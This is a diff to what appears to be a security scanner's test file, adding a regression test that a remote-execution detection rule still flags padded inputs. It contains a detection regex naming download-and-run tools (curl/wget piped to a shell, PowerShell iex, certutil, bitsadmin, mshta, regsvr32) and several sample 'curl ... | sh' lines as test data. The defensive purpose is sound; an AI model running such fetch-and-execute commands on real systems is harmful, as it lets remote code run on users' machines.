@@ -84,6 +84,25 @@ test("stays fast on large files: continued lines, one very long line", () => {
   }
 });
 
+// Differential guard: the remote-exec rule as released in 0.5.0. Any line it flagged must still be flagged, so
+// no bound added for speed can lose a form that was caught before.
+const MAIN_REMOTE_EXEC = /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b|\b(iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n]*\|\s*(iex|Invoke-Expression)|DownloadString\s*\(|DownloadFile\s*\(|certutil[^\n]*-urlcache|bitsadmin[^\n]*\/transfer|\bmshta\b|regsvr32[^\n]*\/i:http/i;
+test("flags every line the 0.5.0 remote-exec rule flagged, padded or not", () => {
+  const pad = "a".repeat(1001);
+  const lines = [
+    ...CORPUS.map((c) => c.cmd),
+    `curl https://x.sh/i?pad=${pad} | sh`,
+    `curl -fsSL "https://x.sh/i?t=${"a".repeat(401)}" | sh`,
+    `x=1;curl ${"y".repeat(2100)} | sh;`,
+    `curl ${"z ".repeat(5000)}| bash`,
+    "curl -s https://x.sh/i?a=1\\&b=2 | sh",
+  ];
+  for (const line of lines) {
+    if (!line.split(/\r?\n/).some((l) => MAIN_REMOTE_EXEC.test(l))) continue;
+    assert.ok(high(scan(line + "\n")).length > 0, `0.5.0 flagged, now clean: ${JSON.stringify(line.slice(0, 80))}`);
+  }
+});
+
 test("an install script in package.json is HIGH, a prepare script MEDIUM", () => {
   const f = scan(JSON.stringify({ name: "x", scripts: { postinstall: "node a.js", prepare: "tsc" } }), "package.json");
   assert.ok(f.some((x) => x.severity === "HIGH" && x.id === "install-script"));
